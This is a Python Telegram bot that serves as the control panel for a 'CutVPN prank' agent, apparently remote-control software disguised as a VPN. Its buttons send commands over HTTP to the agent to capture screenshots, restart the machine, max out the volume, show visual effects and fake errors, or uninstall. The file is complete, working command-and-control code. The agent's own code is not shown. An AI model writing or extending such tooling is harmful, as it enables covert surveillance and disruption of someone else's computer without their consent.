"""CutVPN Telegram prank controller.

This bot only sends authenticated, explicitly requested commands to a CutVPN
agent. Set BOT_TOKEN and CUTVPN_CHAT_ID in the environment before running.
"""
import os
import requests
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes

TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = int(os.environ.get("CUTVPN_CHAT_ID", "0"))
AGENT_URL = os.environ.get("CUTVPN_AGENT_URL", "http://127.0.0.1:8765")


def allowed(update: Update) -> bool:
    return bool(update.effective_chat and update.effective_chat.id == CHAT_ID)


def kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📸 Скриншот", callback_data="screenshot"),
         InlineKeyboardButton("🔄 Перезапуск", callback_data="restart")],
        [InlineKeyboardButton("🔊 Громкость 100%", callback_data="volume")],
        [InlineKeyboardButton("🎭 Визуалы ВКЛ", callback_data="visuals_on"),
         InlineKeyboardButton("🛑 Визуалы ВЫКЛ", callback_data="visuals_off")],
        [InlineKeyboardButton("💥 Тупая ошибка", callback_data="error")],
        [InlineKeyboardButton("🗑️ Удалить CutVPN", callback_data="uninstall")],
    ])


def agent(command: str):
    r = requests.post(f"{AGENT_URL}/command", json={"command": command}, timeout=10)
    r.raise_for_status()
    return r


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed(update):
        return
    await update.message.reply_text("🖥️ CutVPN Prank Control", reply_markup=kb())


async def click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not allowed(update):
        return
    command = q.data
    try:
        agent(command)
        await q.message.reply_text(f"CutVPN: {command} ✓", reply_markup=kb())
    except Exception as exc:
        await q.message.reply_text(f"CutVPN не отвечает: {exc}", reply_markup=kb())


if __name__ == "__main__":
    if not TOKEN or not CHAT_ID:
        raise SystemExit("Set BOT_TOKEN and CUTVPN_CHAT_ID")
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(click))
    app.run_polling()
